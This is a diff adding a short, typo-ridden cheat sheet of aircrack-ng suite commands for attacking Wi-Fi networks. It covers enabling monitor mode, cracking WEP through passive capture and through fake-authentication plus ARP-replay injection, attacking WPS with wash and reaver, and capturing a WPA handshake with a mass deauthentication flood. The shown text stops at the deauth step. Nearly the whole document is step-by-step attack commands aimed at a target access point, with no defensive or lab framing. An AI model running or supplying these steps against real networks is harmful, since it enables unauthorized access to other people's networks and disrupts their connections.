@@ -1,0 +1,33 @@
+Enabling the monitor mode
+#iwconfig
+#airmon-ng
+#airmon-ng start wlan0
+#iwconfig wlan0mon
+-----------------------------------------------------------------------------------
+WEP Cracking in busy network
+#airodump-ng wlan0mon
+#airodump-ng --bssid 00:10:18:90:2D:EE --channel 2 --write basic-test-ap wlan0mon
+(run next commnd in another terminal)
+#aircrack-ng basic-test-ap.cap
+after some time you will get the key
+---------------------------------------------------------------------------------------------------
+WEP Cracking by packet injuction
+#airodump-ng wlan0mon
+airodump-ng --bssid 00:10:18:90:2D:EE --channel 2 --write arpreplay-test-ap wlan0mon
+(run next commnd in another terminal)
+first we will creat fake authentication attack on the targeted system
+#aireplay-ng --fakeauth 0 -a target_mac_address -h our_mac_address wlan0mon
+(next command open in 3rd terminal)
+#aireplay-ng --arpreplay 0 -b target_mac_address -h our_mac_address wlan0mon
+(next command open in 3rd terminal)
+#aircrack-ng arpreplay-test-ap.cap
+======================================================================================================
+WPA Craking if oush button is available
+#wash -i wlan0mon
+#reaver -b bssid -c 11 -i wlan0mon
+-----------------------------------------------------------------------------------------------
+WPA Craking
+#airodump-ng wlan0mon
+airodump-ng --bssid 00:10:18:90:2D:EE --channel 2 --write test-handshak wlan0mon
+(run next commnd in another terminal)
+#aireplay-ng --deauth 40000 -a target_mac_address -c station_mac_address wlan0mon
